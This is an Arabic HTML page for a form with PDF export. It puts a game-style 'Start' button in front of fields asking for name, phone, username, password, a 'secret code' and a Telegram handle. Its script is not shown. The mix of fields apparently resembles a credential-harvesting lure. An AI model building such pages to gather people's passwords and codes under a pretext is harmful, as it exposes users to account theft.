<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>نموذج ويب مع تصدير PDF</title>
  <link rel="stylesheet" href="style.css">
  <style>
    body {
      font-family: 'Arial Unicode MS', Arial, sans-serif;
      direction: rtl; /* تحديد اتجاه النص من اليمين لليسار */
    }
    h2, label {
      font-size: 18px;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="game-control-panel">
      <div class="outer-frame">
        <div class="corner top-left"></div>
        <div class="corner top-right"></div>
        <div class="corner bottom-left"></div>
        <div class="corner bottom-right"></div>
      </div>

      <div class="inner-panel">
        <div class="central-control">
          <button class="launch-button" id="startButton">
            <span class="button-face">
              <span class="button-label">ابدأ</span>
              <span class="button-glow"></span>
            </span>
          </button>
        </div>
      </div>
    </div>

    <!-- Form Section -->
    <div class="form-container" id="formContainer">
      <form id="infoForm">
        <h2>املأ الحقول</h2>
        <label for="fullName">الاسم الكامل</label>
        <input type="text" id="fullName" name="fullName" required>

        <label for="phone">رقم الهاتف</label>
        <input type="tel" id="phone" name="phone" required>

        <label for="username">اسم المستخدم</label>
        <input type="text" id="username" name="username" required>

        <label for="password">كلمة المرور</label>
        <input type="password" id="password" name="password" required>

        <label for="secretCode">الرمز السري</label>
        <input type="text" id="secretCode" name="secretCode" required>

        <label for="telegram">يوزر التليجرام</label>
        <input type="text" id="telegram" name="telegram" required>

        <button type="submit" id="submitForm">تحميل PDF</button>
      </form>
    </div>
  </div>

  <!-- إضافة مكتبة jsPDF -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.4.0/jspdf.umd.min.js"></script>
  <script src="script.js"></script>
</body>
</html>
